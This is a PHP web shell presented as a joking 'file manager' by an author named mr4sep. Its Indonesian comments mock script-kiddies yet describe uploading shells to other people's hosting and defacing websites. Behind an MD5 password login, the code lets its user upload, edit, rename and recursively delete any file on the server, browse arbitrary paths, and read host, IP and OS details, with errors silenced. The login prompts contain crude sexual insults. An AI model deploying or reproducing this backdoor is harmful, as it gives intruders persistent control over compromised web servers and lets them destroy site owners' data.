<?php
// ┌────────────────────────────────────────────────────────────┐
// │              FILE MANAGER KAMU GOBLOK EDITION              │
// │         Dibuat oleh: mr4sep | Asep Raja Jalanan 🐒        │
// └────────────────────────────────────────────────────────────┘
//
// 🤡 Selamat datang, wahai hacker KW yang hidup dari copas!
// Ini adalah tools yang kamu pakai karena kamu: 
// - Gak ngerti coding tapi pengen kelihatan jahat
// - Baru install Termux terus langsung merasa anonymous
// - Liat YouTube "cara deface website" 1x, langsung buat grup WhatsApp "Team H4ck3r 404"
//
// ❌ Tidak ada fitur canggih di sini
// ✅ Tapi cukup buat kamu ngerusak web sendiri tanpa sadar
//
// Fungsi tools ini:
// - Bikin kamu merasa pintar padahal buka Google aja masih typo
// - Ngerename file `config.php` jadi `hilang.php` terus panik
// - Upload shell di hosting orang, lalu bingung kenapa dibanned
//
// 🚨 WARNING:
// Kalau kamu berhasil deface web pake ini, bukan karena kamu jago,
// tapi karena admin web itu LEBIH BODOH dari kamu. Itu bukan prestasi, itu kebetulan.
//
// 💬 Kata pepatah hacker: "Hack the planet!"
// Tapi kamu? "Hack modem aja masih gagal, dasar codet jaringan."
//
// 🏆 Awards yang kamu menangkan:
// 🥉 Juara 3 Lomba Rename Folder Secara Acak
// 🥈 Finalis Turnamen Salah chmod Massal
// 🥇 MVP Coder Tanpa Logika Tahun Ini
//
// 📢 DIBAWAKAN OLEH:
// 👑 mr4sep — mantan tukang parkir yang lebih paham Linux dari kamu
//
// MOTTO HIDUP KITA:
// “Upload dulu, mikir belakangan. Kalau error? Yaudah reinstall hosting.”



session_start();
error_reporting(0);

// Ganti hash MD5 ini dengan milik kamu kalau perlu
$hashed_password = "dc2a5229c7d70313bc7128c13ac5702a";

// Jika belum login, tampilkan form login
if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
    if (isset($_POST['pass'])) {
        if (md5($_POST['pass']) === $hashed_password) {
            $_SESSION['loggedin'] = true;
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        } else {
            echo "<p style='color:red'>Kontolmu kecil jadinya gak masuk lubangnya!</p>";
        }
    }
    echo "<form method='post'>
        <h3>Masukkan kata kata ketika mau ngentod:</h3>
        <input type='password' name='pass'>
        <input type='submit' value='Login'>
    </form>";
    exit;
}

// Fungsi hapus rekursif
function deleteRecursive($target) {
    if (is_dir($target)) {
        $items = scandir($target);
        foreach ($items as $item) {
            if ($item == '.' || $item == '..') continue;
            deleteRecursive($target . DIRECTORY_SEPARATOR . $item);
        }
        rmdir($target);
    } else {
        unlink($target);
    }
}

// Ambil path aktif
$path = isset($_GET['path']) ? $_GET['path'] : getcwd();
$path = realpath($path);
chdir($path);

// Proses DELETE
if (isset($_POST['delete'])) {
    $target = $_POST['delete'];
    if (file_exists($target)) {
        deleteRecursive($target);
    }
}

// Proses rename
if (isset($_POST['rename']) && isset($_POST['newname'])) {
    rename($_POST['rename'], $path . DIRECTORY_SEPARATOR . basename($_POST['newname']));
}

// Proses edit file
if (isset($_POST['editfile']) && isset($_POST['content'])) {
    file_put_contents($_POST['editfile'], $_POST['content']);
}

// Buat file baru
if (isset($_POST['newfile']) && $_POST['newfile'] != '') {
    file_put_contents($path . DIRECTORY_SEPARATOR . basename($_POST['newfile']), '');
}

// Buat folder baru
if (isset($_POST['newfolder']) && $_POST['newfolder'] != '') {
    mkdir($path . DIRECTORY_SEPARATOR . basename($_POST['newfolder']));
}

// Upload file
if (isset($_FILES['upload']) && $_FILES['upload']['error'] == 0) {
    move_uploaded_file($_FILES['upload']['tmp_name'], $path . DIRECTORY_SEPARATOR . basename($_FILES['upload']['name']));
}

$files = scandir('.');

// Info Server
echo "<pre>";
echo "👑 mr4sep — mantan tukang parkir yang lebih paham Linux dari kamu\n";
echo "💳 Detected Identity: Hacker kelas berat... berat di tipu hoax phising\n";
echo "📡 Server: " . $_SERVER['HTTP_HOST'] . " (" . $_SERVER['SERVER_ADDR'] . ")\n";
echo "🧠 OS: " . php_uname() . "\n";
echo "🐘 PHP Versi: " . phpversion() . "\n";
echo "📁 Folder Aktif: $path\n";
echo "⚠️  Catatan: Kalo kamu pakai ini dan bilang kamu hacker, mending uninstall Termux dan daftar jadi tukang lapangan parkir\n";
echo "📛 Status Mental Hacker: Sok jago, hasil Google semua.\n";


// Breadcrumb
$parts = preg_split('~[\\\\/]~', $path);
$cumulative = '';
$is_windows = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
echo "Path: ";
foreach ($parts as $i => $part) {
    if ($is_windows && $i == 0 && preg_match('/^[A-Z]:$/i', $part)) {
        $cumulative = $part;
    } else {
        $cumulative .= DIRECTORY_SEPARATOR . $part;
    }
    echo "<a href='?path=" . urlencode($cumulative) . "'>$part</a>/";
}
echo "</pre>";

// Upload & Buat
echo "<form method='post' enctype='multipart/form-data'>
    <b>Upload File:</b> <input type='file' name='upload'>
    <input type='submit' value='Upload'>
</form>";

echo "<form method='post'>
    <b>Buat File Baru:</b> <input type='text' name='newfile'>
    <input type='submit' value='Buat'>
</form>";

echo "<form method='post'>
    <b>Buat Folder Baru:</b> <input type='text' name='newfolder'>
    <input type='submit' value='Buat'>
</form>";

// Tabel file
echo "<style>
    table { border-collapse: collapse; width: 100%; }
    th, td { border: 1px solid #ccc; padding: 6px 10px; text-align: left; }
    form { display: inline; margin: 0; }
</style>";

echo "<h3>Daftar File dan Folder:</h3>";
echo "<table>";
echo "<tr><th>Nama</th><th>Tipe</th><th>Aksi</th></tr>";

foreach ($files as $file) {
    if ($file == '.' || $file == '..') continue;
    $fullpath = realpath($file);
    $link = "?path=" . urlencode($fullpath);
    $deleteForm = "<form method='post'>
        <input type='hidden' name='delete' value='" . htmlspecialchars($fullpath, ENT_QUOTES) . "'>
        <input type='submit' value='[delete]'>
    </form>";
    echo "<tr>";
    if (is_dir($file)) {
        echo "<td><a href='$link'>$file</a></td><td>DIR</td><td>$deleteForm</td>";
    } else {
        echo "<td>$file</td><td>FILE</td><td>
            <a href='?edit=" . urlencode($fullpath) . "'>[edit]</a> 
            <a href='?rename=" . urlencode($fullpath) . "'>[rename]</a> 
            $deleteForm
        </td>";
    }
    echo "</tr>";
}
echo "</table>";

// Form Edit
if (isset($_GET['edit'])) {
    $file = $_GET['edit'];
    echo "<h3>Edit File: $file</h3>";
    echo "<form method='post'>
    <textarea name='content' rows='20' cols='80'>" . htmlspecialchars(file_get_contents($file)) . "</textarea><br>
    <input type='hidden' name='editfile' value='$file'>
    <input type='submit' value='Save'>
    </form>";
}

// Form Rename
if (isset($_GET['rename'])) {
    $file = $_GET['rename'];
    echo "<h3>Rename File: $file</h3>";
    echo "<form method='post'>
    <input type='hidden' name='rename' value='$file'>
    <input type='text' name='newname' value='" . basename($file) . "'>
    <input type='submit' value='Rename'>
    </form>";
}
?>
